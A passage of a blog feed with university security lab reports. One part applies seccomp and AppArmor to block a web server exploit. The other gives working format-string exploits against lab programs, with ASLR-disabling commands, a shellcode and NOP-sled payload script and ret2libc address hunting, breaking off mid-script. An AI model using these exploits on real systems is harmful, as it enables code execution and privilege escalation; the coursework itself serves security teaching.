</span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(getpid), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(statx), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(close), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(_llseek), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(fcntl64), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(access), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(brk), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(exit_group), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(fchmod), <span class="number">0</span>); </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(stat64), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(fstat64), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(geteuid32), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(fchown32), <span class="number">0</span>);  </span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(fsync), <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// Permissions needed by attack program</span></span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(system), <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(unlink), <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  ret = <span class="built_in">seccomp_load</span>(ctx);  </span><br><span class="line">  <span class="keyword">if</span>(ret &lt; <span class="number">0</span>) &#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;  </span><br><span class="line">  <span class="built_in">seccomp_release</span>(ctx);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Compile and run server</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo make  </span><br><span class="line">sudo chown root touchstone  </span><br><span class="line">sudo chmod +s touchstone  </span><br><span class="line">sudo ./touchstone  </span><br></pre></td></tr></table></figure><h3 id="perform-exploit-test-2">Perform exploit test</h3><h4 id="default-allow-explicit-deny-1">Default allow, explicit deny</h4><p>First create test files</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /tmp/test.txt  </span><br><span class="line">sudo chown root /tmp/test.txt  </span><br><span class="line">ll /tmp/test.txt</span><br></pre></td></tr></table></figure><p>Both file deletion and shell acquisition failed, and there will alsobe system error report popups. The specific results are as shown below,with two audit logs appearing in the dmesg kernel messages.</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619172118447.png"alt="image-20240619172118447" /><figcaption aria-hidden="true">image-20240619172118447</figcaption></figure><p>This approach will bring negative effects, such as inability toregister and connection reset.</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619171801241.png"alt="image-20240619171801241" /><figcaption aria-hidden="true">image-20240619171801241</figcaption></figure><h4 id="default-deny-explicit-allow-1">Default deny, explicit allow</h4><p>First create test files</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /tmp/test.txt  </span><br><span class="line">sudo chown root /tmp/test.txt  </span><br><span class="line">ll /tmp/test.txt</span><br></pre></td></tr></table></figure><p>Both file deletion and shell acquisition failed, results as shownbelow:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621133745249.png"alt="image-20240621133745249" /><figcaption aria-hidden="true">image-20240621133745249</figcaption></figure><p>With the help of AI, the meaning of the audit logs is as follows</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621134819072.png"alt="image-20240621134819072" /><figcaption aria-hidden="true">image-20240621134819072</figcaption></figure><p>But I feel this is more troublesome, must determine which systemcalls need to be used, personally think it’s not as good as the previousone.</p><h3 id="defense-result-analysis-2">Defense Result Analysis</h3><p>seccomp (full name secure computing mode) is a sandbox securitymechanism. In Linux systems, a large number of system calls are directlyexposed to user-space programs. However, not all system calls areneeded, and unsafe code abusing system calls can pose security threatsto the system. Through seccomp, <strong>restrict programs from usingcertain system calls</strong>, which can reduce the system’s attacksurface and put programs into a “secure” state, similar to a<strong>firewall for system calls</strong>.</p><h2id="use-apparmor-to-constrain-web-servers-vulnerable-process-test-exploit">UseAppArmor to constrain web server’s vulnerable process, test exploit</h2><h3 id="experiment-environment-configuration-4">Experiment EnvironmentConfiguration</h3><p>Use cp to create a new code directory code_apparmor, then need tostart apparmor and install related tools.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cp -r ./code ./code_apparmor</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Install AppArmor and related tools</span> </span><br><span class="line">sudo systemctl start apparmor</span><br><span class="line">sudo apt install apparmor-profiles apparmor-utils </span><br></pre></td></tr></table></figure><h3 id="apply-apparmor">Apply AppArmor</h3><p>After the server starts running, use aa-genprof to generateconfiguration file for banksv in the directory:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ./touchstone </span><br><span class="line"></span><br><span class="line">sudo aa-genprof banksv</span><br></pre></td></tr></table></figure><p>Press F to skip, and combine aa-logprof with manually adding rules toimprove the configuration file. The configuration file path is<code>/etc/apparmor.d/home.lixiang.Desktop.lab2.code_apparmor.banksv</code>.</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619184538978.png"alt="image-20240619184538978" /><figcaption aria-hidden="true">image-20240619184538978</figcaption></figure><p>Open the configuration file and write the following content:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619185627994.png"alt="image-20240619185627994" /><figcaption aria-hidden="true">image-20240619185627994</figcaption></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># Last Modified: Wed Jun 19 03:45:02 2024</span><br><span class="line">#include &lt;tunables/global&gt;</span><br><span class="line"></span><br><span class="line">/home/lixiang/Desktop/lab2/code_apparmor/banksv &#123;</span><br><span class="line"></span><br><span class="line">  # Include apache2-common and base abstractions, these abstractions contain some common permission settings.</span><br><span class="line">  include &lt;abstractions/apache2-common&gt;  </span><br><span class="line">  include &lt;abstractions/base&gt;  </span><br><span class="line">  </span><br><span class="line">  # Deny read/write operations on any files in /tmp directory  </span><br><span class="line">  deny /tmp/** mrwx,  </span><br><span class="line"></span><br><span class="line">  # Allow read-only access to all files in code_task5 directory</span><br><span class="line">  /home/lixiang/Desktop/lab2/code_apparmor/** mr,</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Reload the configuration file to make the above configuration fileeffective:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apparmor_parser -r /etc/apparmor.d/home.lixiang.Desktop.lab2.code_apparmor.banksv</span><br></pre></td></tr></table></figure><h3 id="perform-exploit-test-3">Perform exploit test</h3><p>First create test files</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /tmp/test.txt  </span><br><span class="line">sudo chown root /tmp/test.txt  </span><br><span class="line">ll /tmp/test.txt</span><br></pre></td></tr></table></figure><p>File deletion failed:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619190107460.png"alt="image-20240619190107460" /><figcaption aria-hidden="true">image-20240619190107460</figcaption></figure><p>Shell acquisition failed:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619190000149.png"alt="image-20240619190000149" /><figcaption aria-hidden="true">image-20240619190000149</figcaption></figure><p>Use dmesg to view kernel output logs, found two deny rules, exactlyshell execution and unlink:</p><figure><imgsrc="https://pic1.zhimg.com/80/v2-942e24274ddd70aa2ded5bd3200b36f7_720w.png"alt="image-20240619191557469" /><figcaption aria-hidden="true">image-20240619191557469</figcaption></figure><h3 id="problems-encountered-1">Problems Encountered</h3><p>Once defining deny for /tmp folder in the configuration file, usingdmesg cannot see the unlink denied message, but not defining it can seeit, which feels very strange. Another possibility is that the includedconfiguration files themselves contain the most basic access control,including unlink, but file path restrictions will directly cause aproblem which is <strong>access interception</strong>, <strong>fileaccess requests are completely intercepted at the file system level,programs may not have the opportunity to try <code>unlink</code>operations</strong>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Deny read/write operations on any files in /tmp directory  </span><br><span class="line">deny /tmp/** mrwx,  </span><br></pre></td></tr></table></figure><h3 id="defense-result-analysis-3">Defense Result Analysis</h3><p>AppArmor (Application Armor) is a Linux kernel security module usedto limit program capabilities, allowing system administrators to definewhat resources each program can access. AppArmor uses a path-basedaccess control mechanism, defining program security policies throughconfiguration files.</p><p>Main features of AppArmor:</p><ol type="1"><li><strong>Path-based access control</strong>:<ul><li>Use file system paths to define access control rules.</li><li>Configuration files specify which files, directories and resourcesprograms can access.</li></ul></li><li><strong>Configuration files</strong>:<ul><li>Each protected program has a corresponding configuration file,usually located in the <code>/etc/apparmor.d/</code> directory.</li><li>Configuration files define program permissions, including fileaccess, network access, capabilities, etc.</li></ul></li><li><strong>Two modes</strong>:<ul><li><strong>Enforcing mode</strong>: Strictly enforce rules inconfiguration files, any behavior violating rules will be blocked andlogged.</li><li><strong>Complain mode</strong>: Log behavior violating rules, butdon’t block operations. This mode is commonly used for debugging andconfiguring rules.</li></ul></li><li><strong>Integrated into Linux kernel</strong>:<ul><li>As part of Linux Security Modules (LSM), directly implemented in thekernel, providing efficient security control.</li></ul></li><li><strong>Flexibility</strong>:<ul><li>Support different abstraction files (such as<code>&lt;abstractions/base&gt;</code> and<code>&lt;abstractions/apache2-common&gt;</code>), used to simplifyconfiguration of common permissions.</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> HUST Lab Reports </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> Course Experiments </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HUST Information System Security Lab1-Software Security</title>
      <link href="/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab1-Software%20Security/"/>
      <url>/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab1-Software%20Security/</url>
      
        <content type="html"><![CDATA[<h1 id="information-system-security-lab1-record">Information SystemSecurity Lab1 Record</h1><h2 id="prog1-change-var-value">prog1 Change var Value</h2><p>Attack approach: Exploit printf function vulnerability, use %.nx forn-digit length characters, then use %n to write the length of previouslyprinted characters at the given address.</p><ol type="1"><li><p>First, configure the environment and compile the program</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Disable ASLR</span></span><br><span class="line">sudo sysctl -w kernel.randomize_va_space=0 </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Compile prog1.c as 32-bit, need to modify fread to fgets <span class="keyword">in</span> the <span class="built_in">source</span> file</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Remember not to use -fno-stack-protector option</span></span><br><span class="line">gcc -z execstack -o prog1 prog1.c</span><br></pre></td></tr></table></figure></li><li><p>Execute the program and view the layout</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">%08x | %08x | %08x | %08x | %08x</span></span><br><span class="line">.\prog1</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240607173607151.png"alt="1" /><figcaption aria-hidden="true">1</figcaption></figure></li><li><p>Construct format string to modify to 0x66887799</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh exploit_prog1_1.sh bfffed54</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240607181143060.png"alt="2" /><figcaption aria-hidden="true">2</figcaption></figure></li><li><p>Construct format string to modify to 0xdeadbeef</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh exploit_prog1_2.sh bfffed54</span><br></pre></td></tr></table></figure></li></ol><h2 id="prog2-shellcode-injection-obtain-shell">prog2 shellcodeinjection, obtain shell</h2><p>Attack approach: Modify the function return address to the address ofthe injected <code>shellcode</code>. Note that shellcode executes on thestack, so <strong>enable stack execution</strong>.</p><ol type="1"><li><p>Enable stack protection and stack execution</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fstack-protector -z execstack prog2.c -o prog2</span><br></pre></td></tr></table></figure></li><li><p>Look at the relevant addresses, need to overwrite the returnaddress to the shellcode address</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;%08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x&quot; &gt; input2</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240613165532651.png"alt="3" /><figcaption aria-hidden="true">3</figcaption></figure></li><li><p>Also need to confirm how many %.8x are needed to point thepointer to the beginning of the str array</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240613173553393.png"alt="4" /><figcaption aria-hidden="true">4</figcaption></figure></li><li><p>Our goal is to overwrite the return address to a position in thearray, then obtain shell through sled instructions. Fill in thecorresponding parameters in exploit.py. To hit the sled instructions, weneed to add a number, need to try several times, basically 80 is justenough.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># This shellcode creates a local shell</span></span><br><span class="line">local_shellcode= (</span><br><span class="line">  <span class="string">&quot;\x31\xc0\x31\xdb\xb0\xd5\xcd\x80&quot;</span></span><br><span class="line">  <span class="string">&quot;\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50&quot;</span></span><br><span class="line">  <span class="string">&quot;\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x00&quot;</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N = <span class="number">200</span></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Put the code at the end</span></span><br><span class="line">start = N - <span class="built_in">len</span>(local_shellcode)</span><br><span class="line">content[start:] = local_shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Put the address at the beginning</span></span><br><span class="line">addr1 = <span class="number">0xffffd0ae</span></span><br><span class="line">addr2 = <span class="number">0xffffd0ac</span></span><br><span class="line">content[<span class="number">0</span>:<span class="number">4</span>]  =  (addr1).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">content[<span class="number">4</span>:<span class="number">8</span>]  =  (<span class="string">&quot;@@@@&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">8</span>:<span class="number">12</span>]  = (addr2).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate the value of C</span></span><br><span class="line">C = <span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># For investigation purpose (trial and error)</span></span><br><span class="line"><span class="comment">#s = &quot;%.8x_&quot;*C + &quot;%n&quot;  + &quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct the format string</span></span><br><span class="line">small = <span class="number">0xffff</span> - <span class="number">12</span> - C*<span class="number">8</span></span><br><span class="line">large = <span class="number">0x1d0c4</span> - <span class="number">0xffff</span> + <span class="number">75</span></span><br><span class="line">s = <span class="string">&quot;%.8x&quot;</span>*C + <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(small) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%hn&quot;</span>        \</span><br><span class="line">                  + <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(large) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%hn&quot;</span> </span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">12</span>:<span class="number">12</span>+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to badfile</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;input2&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">file.write(content)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure></li></ol><h2 id="prog2-ret2libc-injection-obtain-shell">prog2 ret2libc injection,obtain shell</h2><p>Attack approach: This requires enabling stack non-executableprotection, so we need to bypass it through ret2libc to obtain shell,i.e., using <code>system("/bin/sh")</code></p><ol type="1"><li><p>Enable Stack Guard and stack non-executable protection, compilecommand as follows:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fstack-protector -z noexecstack prog2.c -o prog2</span><br></pre></td></tr></table></figure></li><li><p>First run the program tentatively</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240614171040392.png"alt="image-20240614171040392" /><figcaption aria-hidden="true">image-20240614171040392</figcaption></figure></li><li><p>Next, need to find the corresponding addresses and constructstack details before control flow hijacking. Specifically, need to findthe addresses of <code>system()</code> function and string<code>/bin/sh</code>.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Method 1 -- Directly obtain through gdb</span></span><br><span class="line">gdb -q prog2</span><br><span class="line">b printf</span><br><span class="line">run</span><br><span class="line">info proc map</span><br><span class="line">searchmem &quot;/bin/sh&quot; 0xb7d6a000 0xb7f1d000 # Search for string from libc start address to end address on heap</span><br><span class="line">p system</span><br><span class="line">p exit</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Method 2 -- Obtain through calculation (.so base address + offset address)</span></span><br><span class="line">ldd ./prog2</span><br><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot;system&quot;</span><br><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot;setuid&quot;</span><br><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot;exit&quot;</span><br><span class="line">ropper --file /lib32/libc.so.6 --string &quot;/bin/sh&quot;</span><br><span class="line">gdb -q prog2</span><br><span class="line">b printf</span><br><span class="line">run</span><br><span class="line">info proc map</span><br></pre></td></tr></table></figure><p>First method results:</p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240614171317292.png"alt="image-20240614171317292" /> <imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240614171351094.png"alt="image-20240614171351094" /> <imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240614171414459.png"alt="image-20240614171414459" /></p><p>Second method results:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240614114521711.png"alt="image-20240614114521711" /><figcaption aria-hidden="true">image-20240614114521711</figcaption></figure><p>Both methods calculate the same results: system: 0xb7da4da0, exit:0xb7d989d0, “/bin/sh”: 0xb7ec582b</p></li><li><p>Construct shellcode, overwrite return address to system functionaddress, return address+4 is exit function address, return address+8 assystem function parameter overwrite to /bin/sh address.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_payload</span>(<span class="params">ret_addr, sh_str_addr, exit_addr, system_addr</span>):</span><br><span class="line">    N = <span class="number">200</span></span><br><span class="line"></span><br><span class="line">    addr = ret_addr</span><br><span class="line">    payload = (addr + <span class="number">10</span>).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>) <span class="comment"># high 2 bytes of /bin/sh string address</span></span><br><span class="line">    payload += (<span class="string">&quot;@@@@&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    payload += (addr + <span class="number">8</span>).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>) <span class="comment"># low 2 bytes of /bin/sh string address</span></span><br><span class="line">    payload += (<span class="string">&quot;@@@@&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    payload += (addr + <span class="number">6</span>).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>) <span class="comment"># high 2 bytes of exit address</span></span><br><span class="line">    payload += (<span class="string">&quot;@@@@&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    payload += (addr + <span class="number">4</span>).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>) <span class="comment"># low 2 bytes of exit address</span></span><br><span class="line">    payload += (<span class="string">&quot;@@@@&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    payload += (addr + <span class="number">2</span>).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>) <span class="comment"># high 2 bytes of system address</span></span><br><span class="line">    payload += (<span class="string">&quot;@@@@&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    payload += (addr).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>) <span class="comment"># low 2 bytes of system address</span></span><br><span class="line"></span><br><span class="line">    sh_str_addr = <span class="built_in">int</span>(sh_str_addr, <span class="number">16</span>)</span><br><span class="line">    exit_addr = <span class="built_in">int</span>(exit_addr, <span class="number">16</span>)</span><br><span class="line">    system_addr = <span class="built_in">int</span>(system_addr, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct the format string</span></span><br><span class="line">    offsets = [</span><br><span class="line">        (sh_str_addr &gt;&gt; <span class="number">16</span>) - <span class="built_in">len</span>(payload),</span><br><span class="line">        (sh_str_addr &amp; <span class="number">0xffff</span>) - (sh_str_addr &gt;&gt; <span class="number">16</span>),</span><br><span class="line">        (exit_addr &gt;&gt; <span class="number">16</span>) - (sh_str_addr &amp; <span class="number">0xffff</span>),</span><br><span class="line">        (exit_addr &amp; <span class="number">0xffff</span>) - (exit_addr &gt;&gt; <span class="number">16</span>),</span><br><span class="line">        (system_addr &gt;&gt; <span class="number">16</span>) - (exit_addr &amp; <span class="number">0xffff</span>),</span><br><span class="line">        (system_addr &amp; <span class="number">0xffff</span>) - (system_addr &gt;&gt; <span class="number">16</span>)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Adjust offsets if necessary</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(offsets)):</span><br><span class="line">        <span class="keyword">if</span> offsets[i] &lt;= <span class="number">0</span>:</span><br><span class="line">            offsets[i] += <span class="number">0x10000</span></span><br><span class="line"></span><br><span class="line">    s = <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(offsets[<span class="number">0</span>]) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%17$hn&quot;</span> + 